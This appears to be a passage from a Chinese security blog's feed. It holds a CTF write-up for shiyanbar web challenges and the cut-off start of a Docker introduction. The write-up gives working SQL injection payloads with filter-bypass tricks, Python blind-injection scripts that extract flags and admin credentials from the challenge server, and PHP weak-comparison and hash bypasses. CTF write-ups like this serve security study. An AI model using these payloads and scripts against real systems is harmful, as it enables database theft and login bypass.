table_name='flag'),&#123;&#125;,1)='&#123;&#125;')%23"</span></span><br><span class="line"><span class="comment"># column_name = flag@id</span></span><br><span class="line">payload3 = <span class="string">"?id=0' or (substr((select group_concat(flag separator '@') from flag),&#123;&#125;,1)='&#123;&#125;')%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">30</span>):</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> words:</span><br><span class="line">res = requests.get(url + payload3.format(str(i),item)).text</span><br><span class="line"><span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">flag += item</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> item == <span class="string">'-'</span>:</span><br><span class="line">print(<span class="string">'end'</span>)</span><br><span class="line"><span class="comment"># flag&#123;y0u_@r3_5o_damn_90od&#125; 大小写可能有问题</span></span><br></pre></td></tr></table></figure><p>本题没有过滤其他任何东西，所以其实使用sqlmap等工具更为简单，此处贴出脚本这是为了方便大家了解其中的原理。</p><h1 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h1><p>线简单测试一下 <code>id=1&#39;</code> 页面回显报错，尝试报错注入，可以得到数据库名为 <code>web1</code> ，在尝试一下过滤了那些字符没回发现过滤了许多字符 <code>from</code> , <code>where</code> ,<br><code>group_concat</code> , <code>order</code> , <code>union</code> ，这里有许多字符过滤时另加了一个空格，很恶心。</p><p>最后用报错注入老是有问题，后来决定换union试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; uunion nion selselect ect group_congroup_concatcat(table_name) frfrom om information_schema.tables whwhere ere table_sctable_schemahema=&apos;web1</span><br></pre></td></tr></table></figure><p>可知表名<code>flag,web_1</code> ,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; uunion nion selselect ect group_congroup_concatcat(colucolumn_namemn_name) frfrom om informinformatiion_schemaation_schema.columns whwhere ere table_name=&apos;flag</span><br></pre></td></tr></table></figure><p>结果返回权限不够</p><blockquote><p>SELECT command denied to user ‘web1’@’localhost’ for table ‘columns’</p></blockquote><p>又看到题目说获取flag值，猜测列名应该是flag，</p><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; uunion nion selselect ect flag frfrom om flag whwhere ere &apos;a&apos;=&apos;a</span><br></pre></td></tr></table></figure><h1 id="简单的SQL注入2"><a href="#简单的SQL注入2" class="headerlink" title="简单的SQL注入2"></a>简单的SQL注入2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;%23</span><br></pre></td></tr></table></figure><p>可以正常回显，加空格则不可以，说明过滤了空格，后面测试发现还过滤了括号。空格的绕过可以用/**/绕过，括号的话本题返回的结果数为所有结果，所以其实并不需要括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;/**/union/**/select/**/table_name/**/from/**/information_schema.tables%23</span><br><span class="line">?id=-1&apos;/**/union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&apos;flag&apos;%23</span><br><span class="line">?id=-1&apos;/**/union/**/select/**/flag/**/from/**/flag%23</span><br></pre></td></tr></table></figure><h1 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单"></a>这个看起来有点简单</h1><p>很常规的一套操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><p>后面的省略</p><h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>查看元素即可得到源码，这是基础，源码位置在 <code>source.txt</code> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>关键代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;浜﹀彲璧涜墖锛�&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一道绕过要求必须返回结果切值返回一行结果，可以考虑limit，由于逗号也被过滤了，故可以使用offset来控制返回的结果个数，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;&apos; or 1=1 limit 1 offset 0</span><br></pre></td></tr></table></figure><p>但是这里第二道过滤要求提交的密码和数据库中的对应的密码相同，这个就困难了，因为我们并不知道数据库中的pwd字段值，所以这个时候看了别的大佬想到了rollup，说来惭愧，这个我之前学习SQL的时候还专门看过，结果在这题却没有想到，哎，真的是菜鸡，为什么可以用rollup原理可以在我的博客中《SQL学习笔记三》中找到，原理就是使用rollup子句会多产生一个汇总行，如果我们没有指定聚合函数，那么它的值就会是NULL，rollup子句是和group by子句一起使用的，只会在group指定的列中产生汇总行，那么就可尝试构造payload了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=uname=&apos; or 1=1 group by pwd with rollup limit 1 offset 2#&amp;pwd=</span><br></pre></td></tr></table></figure><p>这里通过更改offset后面的数字值来使数据库返回有NULL的那一行即可，至于pwd值可以利用PHP弱比较，空字符与NULL相比较会返回true，所以我们pwd不传参即可是比较返回true。</p><p>注意：这题用的rollup子句我在自己的数据库上试了之后发现不行，原因在于sql_mode的设置，查看一下数据库的该值</p><blockquote><p>Variable_name | Value<br>sql_mode       | ONLY_FULL_GROUP_BY,STRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER</p></blockquote><p>默认会设置有 <font face="futura">ONLY_FULL_GROUP_BY</font>这个模式，此时group by子句中必须包含所查询的所有列，具体的信息可以查看我的之前那篇博客，这是默认开启的，而此题目该模式应该是关闭的，运行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set GLOBAL sql_mode=&apos;TRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER&apos;</span><br></pre></td></tr></table></figure><p>如此即可以在自己的数据库上实现相同的效果。</p><h1 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h1><p>查看元素，发现语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;)</span><br></pre></td></tr></table></figure><p>可知是利用md5弱比较，</p><p>故提交username为 <code>s878926199a</code> ,即可得到下一个页面地址，得到如下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$unserialize_str = $_POST[&apos;password&apos;]; </span><br><span class="line">$data_unserialize = unserialize($unserialize_str); </span><br><span class="line">if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) &#123; </span><br><span class="line">print_r($flag); </span><br><span class="line">&#125; </span><br><span class="line">伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br></pre></td></tr></table></figure><p>看代码可知是简单的反序列化的应用，但是比较坑的是这儿的user和pass的值是布尔true，因为题目提示了成也布尔，败也布尔（23333）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a[&apos;user&apos;] = true;</span><br><span class="line">$a[&apos;pass&apos;] = true;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">print($b);</span><br></pre></td></tr></table></figure><p>提交就可以了。</p><h1 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h1><p>代码审计，就是绕过的题目的过来吧就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/indirection\index.php/index.php</span><br></pre></td></tr></table></figure><p>关键点就是还是利用\来替换/，尽管题目限制了\，但是在此处并没有受到限制</p><h1 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h1><p>查看元素，发现一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;showsource&quot; value=&quot;0&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure><p>直接修改值为1即可查看源代码，然后一波简单操作就得到flag</p><h1 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h1><p>先随便输入个邮箱之后页面会返回跳转链接 <code>step2.php?email=youmail@mail.com&amp;check=???????</code> ,访问发现页面会自动跳转到step1.php，抓包看一下发现关键点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;submit.php&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">&lt;h1&gt;æ¾åå¯ç step2&lt;/h1&gt;</span><br><span class="line">email:&lt;input name=&quot;emailAddress&quot; type=&quot;text&quot; &lt;br /&gt;</span><br><span class="line">value=&quot;youmail@mail.com&quot;  disable=&quot;true&quot;/&gt;&lt;/br&gt;</span><br><span class="line">token:&lt;input name=&quot;token&quot; type=&quot;text&quot; /&gt;&lt;/br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>访问submit.php页面，提示不是admin，在查看抓包内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;admin&quot; content=&quot;admin@simplexue.com&quot; /&gt;</span><br><span class="line">&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /&gt;</span><br></pre></td></tr></table></figure><p>发现是vim编辑器，那么可能是备份文件泄露，访问 .submit.php.swp得到源代码，核心过滤如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br></pre></td></tr></table></figure><p>这个用0e即可绕过，剩下的就是admin的邮箱，前面有一段内容 <code>content=&quot;admin@simplexue.com&quot;</code> 猜测可能就是admin邮箱，提交一下果然可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0e00000000</span><br></pre></td></tr></table></figure><h1 id="once-more"><a href="#once-more" class="headerlink" title="once more"></a>once more</h1><p>很简单，ereg()函数截断，只在PHP5中才有，注意要在地址栏中提交因为在题目给的输入框中提交会再次url编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1e8%00*-*</span><br></pre></td></tr></table></figure><h1 id="Guess-next-session"><a href="#Guess-next-session" class="headerlink" title="Guess next session"></a>Guess next session</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(); </span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;])</span><br><span class="line">        die (&apos;Flag: &apos;.$flag);</span><br><span class="line">    else</span><br><span class="line">        print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>题目最后一行给出的应该是密码的生成逻辑，显然是不可能构造出来的，那么我们可以通过修改session(删除掉对应的sessionid)使 <code>$_SESSION[&#39;password&#39;]</code> 为空，那么我们提交一个空的密码那么在验证时就会有 <code>&#39;&#39;==&#39;&#39;</code> 为true，即可验证通过</p><h1 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>sha1数组绕过即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]=2&amp;password[]=1</span><br></pre></td></tr></table></figure><h1 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h1><p>查看元素可以看到有个 <code>index.txt</code> ，访问以下得到源码，这里只给出部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">$conn = mysql_connect(<span class="string">"********"</span>, <span class="string">"*****"</span>, <span class="string">"********"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"phpformysql"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select pw from php where user='$user'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析题目逻辑，先是将输入的密码值md5变换一下，在数据中查询与用户名相等的用户名并提取结果，然后用返回结果对应的密码字段和刚昂MD5变换后的字段比较，如果相等则成功返回flag，我刚开始想思路放在strcasecmp()函数上，思路并不对。这题的突破口在于sql语句，我们可以尝试sql注入，尝试绕过这个user认证字段，即user字段提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and 0=1 union select &apos;c4ca4238a0b923820dcc509a6f75849b&apos;#</span><br></pre></td></tr></table></figure><p>那么此时数据库返回的$row[pw]就是输入的这段md5值(1的md5值)，我们只需要在密码字段提交1即可绕过了，最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&apos; and 0=1 union select &apos;c4ca4238a0b923820dcc509a6f75849b&apos;#&amp;pass=1</span><br></pre></td></tr></table></figure><h1 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h1><p>url二次编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%2568%2561%2563%256b%2565%2572%2544%254a</span><br></pre></td></tr></table></figure><h1 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h1><p>简单的x-forwarded-for修改即可</p><h1 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h1><p>先是随便在admin字段尝试（因为admin字段有回显），当输入 <code>admin&#39; and 1=1#</code> 时返回“登录失败，错误的用户名和密码”，而如果输入 <code>admin&#39; and 1=2#</code> 时，则返回“数据库连接错误”！！，所以这儿是一处注入点</p><p>判断数据库长度 <code>admin&#39; and length(database())=4#</code> 可知数据库长度为4，接下来爆库名 <code>?admin=admin&#39; and substr(database(),1,3)=&#39;tes&#39;%23&amp;pass=12456&amp;action=login</code> ,数据库名是 <code>test</code> </p><p>盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and "</span></span><br><span class="line">dic = <span class="string">',1234567890()qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@'</span></span><br><span class="line"><span class="comment"># payload = "substr((Select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login"</span></span><br><span class="line">yes = <span class="string">'错误'</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">table_name = <span class="string">''</span>  <span class="comment"># admin</span></span><br><span class="line">column_name = <span class="string">''</span> <span class="comment"># username,password</span></span><br><span class="line"><span class="comment"># payload = "substr((Select group_concat(column_name) from information_schema.columns where table_name='admin'),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login"</span></span><br><span class="line">payload = <span class="string">"substr((Select group_concat(username,password) from admin),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login"</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">res = requests.get(url + payload.format(str(length),i)).text.encode(<span class="string">'latin-1'</span>).decode(<span class="string">'gb2312'</span>)</span><br><span class="line"><span class="keyword">if</span> yes <span class="keyword">in</span> res:</span><br><span class="line"><span class="comment"># table_name += i</span></span><br><span class="line">column_name += i</span><br><span class="line">length += <span class="number">1</span></span><br><span class="line">print(column_name)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">'@'</span>:</span><br><span class="line">print(<span class="string">'aaaaaaaaaaaaaaaaaaaaaa'</span>)</span><br><span class="line"><span class="comment"># admin,idnuenna</span></span><br></pre></td></tr></table></figure><h1 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h1><p>脑洞题，注意题目响应头 <code>Content-Row: MTUyODYyMjkxMQ==</code> 直接把这个内容提交验证即可。。</p><h1 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h1><p>打开后看到有如下要求</p><blockquote><p>You don’t have permission to access / on this server.<br>Please make sure you have installed .net framework 9.9!<br>Make sure you are in the region of England and browsing this site with Internet Explorer</p></blockquote><p>第一个本题好像实际上并没有限制，第二个可以通过修改user-agent字段，修改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 9.9; .NET CLR 3.5.30729; rv:11.0) like Geckog</span><br></pre></td></tr></table></figure><p>第三个要求来自英国，可以通过修改accept-language字段的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">en-gb;q=0.8</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Docker简介与简单页面搭建</title>
    <link href="http://chaosec.top/2018/04/20/docker1/"/>
    <id>http://chaosec.top/2018/04/20/docker1/</id>
    <published>2018-04-20T04:56:05.000Z</published>
    <updated>2019-01-30T11:55:43.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><p>最近要和同学做一个PHP项目需要用到docker，正好也对这个东东挺好奇的，顺便来学习一波，何为docker呢？docker的本质其实就是容器，类似于虚拟机，但是又比虚拟机更加小巧，容器技术是基于linux的内核特性(Namespace和Cgroups)的一项技术，所以在其上只能运行类linux系统而不能运行Windows系统，使用虚拟机部署文件时既需要应用和应用依赖的库，还需要完整的操作系统，但是容器的话则只需要应用和应用依赖的库即可，但是在docker之前容器的应用并不广泛，原因在于容器的自动化程度不高，部署复杂，而docker的出现则弥补了这些缺点，所以能够得到业界广泛的使用。</p><a id="more"></a><p><img src="/2018/04/20/docker1/1.jpg" alt=""></p><h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><h2 id="安装前检查"><a href="#安装前检查" class="headerlink" title="安装前检查"></a>安装前检查</h2><ol><li>内核版本(具体支持哪些版本可以在官网查看)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>如果内核不支持可以升级内核</p><ol><li>检查Device Mapper(存储驱动)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls  -l 